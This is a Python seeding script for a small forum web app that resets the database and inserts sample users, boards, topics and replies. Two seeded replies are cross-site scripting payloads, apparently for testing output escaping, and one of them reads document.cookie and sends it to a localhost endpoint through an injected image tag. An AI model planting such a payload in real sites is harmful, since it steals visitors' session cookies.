from sqlalchemy import Column, String

from models import reset_database, SQLMixin, SQLBase
from models.board import Board
from models.reply import Reply
from models.topic import Topic
from models.user import User


class Test(SQLMixin, SQLBase):
    __tablename__ = 'Test'
    username = Column(String(20), nullable=False)


def main():
    reset_database()

    # t = Test.new(
    #     username='test username'
    # )
    # t.username
    # Test.usrename

    User.new(
        username='gua',
        password='123',
        image='/static/images/1.jpg',
        signature='sssss',
    )

    User.new(
        username='guagua',
        password='123',
        image='/static/images/3.jpg',
        signature='bbbbbb',
    )

    Board.new(
        id=1,
        title="gua",
    )
    Board.new(
        id=2,
        title="water",
    )
    Board.new(
        id=3,
        title="test",
    )
    Board.new(
        id=4,
        title="fffffff",
    )

    Topic.new(
        views=20,
        title="water11",
        content="1111111111111",
        user_id=1,
        board_id=2,
    )
    Topic.new(
        views=20,
        title="water22",
        content="1111111111111",
        user_id=1,
        board_id=2,
    )
    Topic.new(
        views=20,
        title="test11",
        content="1111111111111",
        user_id=1,
        board_id=3,
    )
    Topic.new(
        views=20,
        title="test22",
        content="1111111111111",
        user_id=1,
        board_id=3,
    )

    Reply.new(
        content="<script>\r\nc = document.cookie\r\ntag = `<img src='http://localhost:2000/gua?cookie=${c}'>`\r\ndocument.body.insertAdjacentHTML('afterend', tag);\r\nconsole.log('cookie', c)\r\nconsole.log('tag', tag)\r\n</script>",
        topic_id=2,
        user_id=1,
    )
    Reply.new(
        content="<script>alert('test')</script>",
        topic_id=1,
        user_id=1,
    )

    Reply.new(
        content="# 示例\r\n\r\n# 标题\r\n\r\n**粗体**\r\n\r\n- 缩进\r\n  - 缩进\r\n\r\n行内高亮： `markdown`\r\n\r\n按键：CTRL\r\n\r\n> 多层引用\r\n> > 多层引用\r\n\r\n———— \r\n\r\n> 单层引用\r\n> 单层引用\r\n\r\n| 表格 | 表格 |\r\n| -    |  -   |\r\n| 表格 | 表格 |\r\n\r\n\r\n图片： ![图片](https://vip.kybmig.cc/uploads/avatar/2017090517-74X25272-286f-4aba-8f62-005188ffd4bd.jpg)\r\n\r\n\r\n\r\n代码高亮：\r\n```python\r\ndef dict_recursion(dict_all):\r\n    if isinstance(dict_all, dict):\r\n        for x in dict_all:\r\n            dict_key = x\r\n            dict_value = dict_all[dict_key]\r\n            print(\"{}:{}\".format(dict_key, dict_value))\r\n            dict_recursion(dict_value)\r\n    else:\r\n        return\r\n```",
        topic_id=1,
        user_id=1,
    )


if __name__ == '__main__':
    main()
